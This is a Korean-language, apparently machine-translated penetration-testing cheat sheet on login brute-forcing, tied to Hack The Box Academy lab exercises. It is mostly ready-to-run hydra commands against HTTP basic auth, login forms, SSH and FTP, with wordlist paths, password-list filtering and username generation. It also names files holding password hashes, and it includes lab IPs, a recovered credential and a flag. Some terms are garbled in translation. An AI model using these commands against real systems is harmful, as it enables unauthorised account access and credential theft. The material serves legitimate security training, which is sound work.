# 로그인 무차별 대입

## 로그인 무차별 대입



## 비밀번호 HASH 열거



> 오프라인 무차별 대입을 위해 해시된 비밀번호를 포함할 수 있는 파일:

| **윈도우**     | **리눅스**     |
| ----------- | ----------- |
| 무인.xml      | 그림자         |
| sysprep.inf | 섀도우.박       |
| 샘           | 비밀번호 / 비밀번호 |

## 히드라



| **명령**                                                                                                                                 | **설명**                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `hydra -h`                                                                                                                             | 히드라 도움                                                                                                               |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /`                                                                                   | 기본 인증 무차별 대입 - 결합된 단어 목록                                                                                             |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`                                                             | 기본 인증 무차별 대입 - 사용자/암호 단어 목록                                                                                          |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | 로그인 양식 무차별 대입 - 정적 사용자, 단어 목록 전달                                                                                     |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4`                                                                     | SSH 무차별 대입 - 사용자/패스 단어 목록 [서비스 인증 무차별 대입](https://academy.hackthebox.com/module/57/section/491)                      |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`                                                                                   | FTP 무차별 대입 - 정적 사용자, 단어 목록 전달                                                                                        |
| `hydra -l b.gates -P william.txt ssh://83.136.251.221:53718`                                                                           | 이 섹션에서 배운 내용을 사용하여 위에 표시된 대상 서버에서 "b.gates" 사용자의 SSH 로그인을 무차별 공격해 보세요. 그런 다음 서버에 SSH를 시도하십시오. 홈 디렉토리에서 플래그를 찾아야 합니다. |

## 단어 목록



| **기울기**                                                                           | **설명**                                                                                     |
| --------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | 기본 비밀번호 단어 목록 [사전 공격 - 단어 목록에 대한 SecLists 저장소](https://github.com/danielmiessler/SecLists) |
| `/usr/share/wordlists/rockyou.txt`                                                | 가장 일반적인 비밀번호 단어 목록                                                                         |
| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt`                   | 이 유출된 데이터베이스 파일 rockyou-10의 seclists 비밀번호에는 92개의 항목이 포함되어 있습니다.                            |
| `/usr/share/seclists/Usernames/Names/names.txt`                                   | 일반 이름 단어 목록                                                                                |

## 기본 비밀번호



> 특히 기본 서비스 비밀번호가 변경되지 않은 경우에는 함께 사용되는 사용자 이름과 비밀번호 쌍을 찾는 것이 매우 일반적입니다. [기본 비밀번호 - 로그인 무차별](https://academy.hackthebox.com/module/57/section/498) POST 양식:

```
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f 83.136.251.168 -s 52278 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

> [HYDRA - 무차별 대입 양식](https://academy.hackthebox.com/module/57/section/489)\
> [사용자 이름 무차별 대입](https://academy.hackthebox.com/module/57/section/487)

[![기본 비밀번호 HTB{bru73\_f0rc1n6\_15\_4\_l457\_r350r7}](https://github.com/missteek/cpts-quick-references/raw/main/images/default-passwords.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/default-passwords.png)

> 위 스크린샷은 Burp Proxy를 사용하여 [로그인 매개변수를 결정하는 모습 을 보여줍니다.](https://academy.hackthebox.com/module/57/section/504)

## 맞춤형 단어 목록



| **명령**                                                   | **설명**                                                                                   |
| -------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| `cupp -i`                                                | [사용자 정의 비밀번호 단어 목록 개인화된 단어 목록](https://academy.hackthebox.com/module/57/section/512) 만들기 |
| `sed -ri '/^.{,7}$/d' william.txt`                       | 8보다 짧은 비밀번호 제거                                                                           |
| ``sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``          | 특수 문자 없이 비밀번호 제거                                                                         |
| `sed -ri '/[0-9]+/!d' william.txt`                       | 숫자가 없는 비밀번호 제거                                                                           |
| `./username-anarchy Bill Gates > bill.txt`               | 사용자 이름 목록 생성 [GITHUB 사용자 이름 무정부 상태](https://github.com/urbanadventurer/username-anarchy) |
| `ssh b.gates@SERVER_IP -p PORT`                          | 서버에 SSH로                                                                                 |
| `ftp 127.0.0.1`                                          | FTP에서 서버로                                                                                |
| `su - user`                                              | 사용자로 전환                                                                                  |
| `netstat -antp \| grep -i list`                          | 내부 네트워크 서비스와 로컬 피해자 컴퓨터에서 실행 중인 해당 포트를 식별합니다.                                            |
| `scp -P 53718 ./william.txt b.gates@83.136.251.221:/tmp` | `b.gates`사용자 및 비밀번호 에 대한 자격 증명을 획득한 SCP를 사용하여 `4dn1l3M!$`파일을 대상에 복사합니다.                  |
| `hydra -l m.gates -P /tmp/william.txt ftp://127.0.0.1`   | `hydra`내부 FTP 서비스에 대해 사용자의 비밀번호를 식별하기 위해 피해자를 로컬에서 사용합니다 .                               |
